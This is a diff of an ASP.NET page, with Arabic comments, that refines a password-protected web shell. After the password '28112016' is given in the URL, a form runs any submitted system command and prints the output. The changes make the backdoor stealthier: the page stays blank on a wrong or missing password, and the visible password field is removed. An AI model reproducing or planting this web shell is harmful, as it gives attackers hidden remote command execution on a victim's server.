@@ -4,15 +4,15 @@
 <script runat="server">
     protected void Page_Load(object sender, EventArgs e)
     {
-        // تحقق إذا تم تمرير متغير cmd
+        // تحقق إذا تم تمرير المتغير cmd في URL
         if (Request["cmd"] != null)
         {
             string command = Request["cmd"];
             
-            // تحقق من أن القيمة المدخلة هي "28112016"
+            // تحقق من أن كلمة المرور هي "28112016"
             if (command == "28112016")
             {
-                // بعد إدخال كلمة المرور الصحيحة، اظهر المدخل لتنفيذ الأوامر
+                // إذا كانت كلمة المرور صحيحة، اعرض النموذج لإدخال الأمر
                 Response.Write(@"
                     <form method='get'>
                         Command: <input type='text' name='execute' />
@@ -21,7 +21,7 @@
                     </form>
                 ");
 
-                // إذا تم إدخال أمر، نفذه
+                // إذا تم إدخال أمر، قم بتنفيذه
                 string cmdCommand = Request["execute"];
                 if (!string.IsNullOrEmpty(cmdCommand))
                 {
@@ -37,10 +37,15 @@
                     Response.Write("<pre>" + output + "</pre>");
                 }
             }
+            else
+            {
+                // إذا كانت كلمة المرور غير صحيحة، لا تعرض أي شيء
+                Response.Clear();
+            }
         }
         else
         {
-            // لا تعرض أي شيء عند فتح الصفحة لأول مرة
+            // إذا لم يتم إدخال كلمة المرور، لا تعرض أي شيء (الصفحة تظل بيضاء)
             Response.Clear();
         }
     }
@@ -48,13 +53,6 @@
 
 <html>
 <body>
-    <form method="get">
-        <!-- المدخل الأول لكلمة المرور -->
-        <input type="password" name="cmd" style="display:none;" autofocus />
-        <script>
-            // بعد تحميل الصفحة، اجعل المدخل الخاص بكلمة المرور يظهر
-            document.getElementsByName('cmd')[0].style.display = 'block';
-        </script>
-    </form>
+    <!-- لا شيء يظهر هنا عند فتح الصفحة لأول مرة -->
 </body>
 </html>
